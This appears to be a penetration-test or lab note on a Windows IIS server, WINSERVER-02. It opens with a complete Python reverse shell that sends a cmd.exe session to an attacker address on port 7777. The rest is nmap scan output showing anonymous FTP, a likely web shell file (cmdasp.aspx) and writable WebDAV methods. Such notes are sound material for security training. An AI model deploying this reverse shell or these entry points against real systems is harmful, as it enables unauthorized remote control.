
# **192.168.100.51 WINSERVER-02:**

## I got a shell using this reverse shell script:
	
	import os,socket,subprocess,threading; def s2p(s, p):     while True:         data = s.recv(1024)         if len(data) > 0:             p.stdin.write(data)             p.stdin.flush()  def p2s(s, p):     while True:         s.send(p.stdout.read(1))  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("192.168.100.5",7777))  p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)  s2p_thread = threading.Thread(target=s2p, args=[s, p]) s2p_thread.daemon = True s2p_thread.start()  p2s_thread = threading.Thread(target=p2s, args=[s, p]) p2s_thread.daemon = True p2s_thread.start()  try:     p.wait() except KeyboardInterrupt:     s.close()
	

# **Open Ports:**


	PORT      STATE SERVICE       REASON
	21/tcp    open  ftp           syn-ack ttl 128
	80/tcp    open  http          syn-ack ttl 128
	135/tcp   open  msrpc         syn-ack ttl 128
	139/tcp   open  netbios-ssn   syn-ack ttl 128
	445/tcp   open  microsoft-ds  syn-ack ttl 128
	3389/tcp  open  ms-wbt-server syn-ack ttl 128
	5985/tcp  open  wsman         syn-ack ttl 128
	47001/tcp open  winrm         syn-ack ttl 128
	49152/tcp open  unknown       syn-ack ttl 128
	49153/tcp open  unknown       syn-ack ttl 128
	49154/tcp open  unknown       syn-ack ttl 128
	49155/tcp open  unknown       syn-ack ttl 128
	49160/tcp open  unknown       syn-ack ttl 128
	49170/tcp open  unknown       syn-ack ttl 128



# **Services on Open Ports:**


	PORT     STATE SERVICE            REASON          VERSION
	21/tcp   open  ftp                syn-ack ttl 128 Microsoft ftpd
	| ftp-syst: 
	|_  SYST: Windows_NT
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| 04-19-22  02:25AM       <DIR>          aspnet_client
	| 04-19-22  01:19AM                 1400 cmdasp.aspx
	| 04-19-22  12:17AM                99710 iis-85.png
	| 04-19-22  12:17AM                  701 iisstart.htm
	|_04-19-22  02:13AM                   22 robots.txt.txt
	80/tcp   open  http               syn-ack ttl 128 Microsoft IIS httpd 8.5
	|_http-server-header: Microsoft-IIS/8.5
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
	|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
	| http-webdav-scan: 
	|   WebDAV type: Unknown
	|   Server Date: Fri, 30 May 2025 16:04:12 GMT
	|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
	|   Server Type: Microsoft-IIS/8.5
	|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
	|   Directory Listing: 
	|     http://192.168.100.51/
	|     http://192.168.100.51/aspnet_client/
	|     http://192.168.100.51/cmdasp.aspx
	|     http://192.168.100.51/iis-85.png
	|     http://192.168.100.51/iisstart.htm
	|     http://192.168.100.51/robots.txt.txt
	|   Exposed Internal IPs: 
	|_    192.168.100.51
	|_http-svn-info: ERROR: Script execution failed (use -d to debug)
	|_http-title: IIS Windows Server
	135/tcp  open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
	139/tcp  open  netbios-ssn        syn-ack ttl 128 Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds       syn-ack ttl 128 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 128
	| ssl-cert: Subject: commonName=WINSERVER-02
	| Issuer: commonName=WINSERVER-02
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2025-05-29T15:31:07
	| Not valid after:  2025-11-28T15:31:07
	| MD5:   442b 1b31 fcc4 4465 9edc e84e c593 d085
	| SHA-1: e3f8 eae1 61d2 14b5 d9e2 8bbe f556 1b73 48c0 1d30
	| -----BEGIN CERTIFICATE-----
	| MIIC3DCCAcSgAwIBAgIQEFKbVw632rBOU7+65CrmATANBgkqhkiG9w0BAQsFADAX
	| MRUwEwYDVQQDEwxXSU5TRVJWRVItMDIwHhcNMjUwNTI5MTUzMTA3WhcNMjUxMTI4
	| MTUzMTA3WjAXMRUwEwYDVQQDEwxXSU5TRVJWRVItMDIwggEiMA0GCSqGSIb3DQEB
	| AQUAA4IBDwAwggEKAoIBAQC1m5i58i0Td+RRKmCG2lEcvf6qnV/KouA4WiUc1vHr
	| UfSRKXwSW+oLJnfG/A5A0fEVbuTfnPiGsoq/7/x2wh7ISlJCrh4UuS50yb86C39j
	| GTv0oZHPJ0lWAqxeF8TbtZX1m0nAtRgH1i1R338gdYwR+0IIPQADZbKRdcrPq5p3
	| eL3qqCUFg7xdTnRU673n86Wm1VvgBVoLaNuFIf1hPm+Oyyz8IXFl9VT9fhfMCL2Z
	| rQRZbhYTt5KOak/CSl3XCPsbjsb11f6d+FLGRxqn8riQ8tM5PfnhqkxI6C9wSuqr
	| LQuGk82SJelx6XiXY70Hep0o/cdzCMlqY9QpGB9iUtsHAgMBAAGjJDAiMBMGA1Ud
	| JQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEA
	| pKIVC/ZQg59db1iGEMXg17PhsA32dUqHU0qrbvR2g7lXtEUlkGEnETV3MHr4gjS9
	| O1JmxwleCTPjrqLfGxc/SXdKQ248bvQzOZsJ5uORgiwwfA2USVed7gsrqYpsqbU+
	| GiZD0ZI6n4uDRwy6PmGmsCbzyjdvC+JvLoSbnCKWvTOCQoEwf0Ev34IG6kI+gofk
	| QO3MJmc9CwZ86HoTTeEOF8Q1dPq6b7vYkMU2FZNBgqceKlxDSPFD88fREAYP0d0H
	| WePv4VjdlBqlV2beR++fHD1RyNRuLwvgC9LqU/tgPotu55x892Gxebwx+pVKPRtY
	| xnCNJoN5BoJA2RBbUQ3SCg==
	|_-----END CERTIFICATE-----
	|_ssl-date: 2025-05-30T16:04:18+00:00; 0s from scanner time.
	| rdp-ntlm-info: 
	|   Target_Name: WINSERVER-02
	|   NetBIOS_Domain_Name: WINSERVER-02
	|   NetBIOS_Computer_Name: WINSERVER-02
	|   DNS_Domain_Name: WINSERVER-02
	|   DNS_Computer_Name: WINSERVER-02
	|   Product_Version: 6.3.9600
	|_  System_Time: 2025-05-30T16:04:12+00:00
	5985/tcp open  http               syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	47001/tcp open  http    syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	
